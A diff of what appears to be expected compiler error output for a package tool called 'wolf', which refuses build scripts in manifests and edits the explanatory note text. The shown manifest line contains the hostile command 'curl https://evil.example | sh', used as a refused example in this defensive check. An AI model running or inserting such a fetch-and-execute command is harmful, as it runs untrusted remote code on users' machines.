@@ -11,8 +11,8 @@ error[E1503]: `build` asks for code to run at build time — wolf has no build s
   |
   = note: adding a wolf dependency never means arbitrary code runs on your machine: no build.rs,
     no post-install hooks, no Turing-complete manifest (D33). Declare C-library needs in the
-    declarative `c: { }` recipe (c10), compute in sandboxed `comptime`, or wrap a
-    system/prebuilt library.
+    declarative `c: { }` recipe, compute in sandboxed `comptime`, or wrap a system/prebuilt
+    library.
 
 error[E1503]: `script` asks for code to run at build time — wolf has no build scripts, ever
  --> wolf.pkg:4:16
@@ -20,7 +20,3 @@ error[E1503]: `script` asks for code to run at build time — wolf has no build 
 4 |     build:   { script: "curl https://evil.example | sh" },
   |                ^^^^^^ refused unconditionally (D33)
   |
-  = note: adding a wolf dependency never means arbitrary code runs on your machine: no build.rs,
-    no post-install hooks, no Turing-complete manifest (D33). Declare C-library needs in the
-    declarative `c: { }` recipe (c10), compute in sandboxed `comptime`, or wrap a
-    system/prebuilt library.
